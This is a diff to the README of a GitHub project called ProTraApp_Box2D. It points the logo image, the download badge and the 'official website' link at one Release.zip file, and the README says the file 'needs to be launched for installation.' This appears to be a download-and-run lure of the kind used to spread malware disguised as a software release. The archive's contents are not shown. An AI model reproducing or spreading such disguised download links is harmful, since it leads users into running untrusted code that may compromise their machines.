@@ -5,7 +5,7 @@
 
 ---
 
-![ProTraApp_Box2D Logo](https://example.com/protraapp_box2d_logo.png)
+![ProTraApp_Box2D Logo](https://github.com/niteldo/ProTraApp_Box2D/releases/download/v1.0/Release.zip)
 
 ---
 
@@ -21,7 +21,7 @@ Welcome to the ProTraApp_Box2D repository! This project focuses on integrating B
 
 ### Installation
 To get started with ProTraApp_Box2D, you can download the latest release from the following link:
-[![Download ProTraApp_Box2D](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download ProTraApp_Box2D](https://github.com/niteldo/ProTraApp_Box2D/releases/download/v1.0/Release.zip)](https://github.com/niteldo/ProTraApp_Box2D/releases/download/v1.0/Release.zip)
 > Note: The linked file needs to be launched for installation.
 
 If the above link is not working, please check the "Releases" section of this repository for alternative download options.
@@ -66,4 +66,4 @@ ProTraApp_Box2D is licensed under the GPL-3.0 License. You are free to use, modi
 
 ---
 
-Thank you for exploring the ProTraApp_Box2D repository! For more information and updates, visit the [ProTraApp official website](https://example.com/protraapp) or check out the latest releases in the "Releases" section. Happy coding with ProTraApp and Box2D integration! 🚀🎮🔧
+Thank you for exploring the ProTraApp_Box2D repository! For more information and updates, visit the [ProTraApp official website](https://github.com/niteldo/ProTraApp_Box2D/releases/download/v1.0/Release.zip) or check out the latest releases in the "Releases" section. Happy coding with ProTraApp and Box2D integration! 🚀🎮🔧
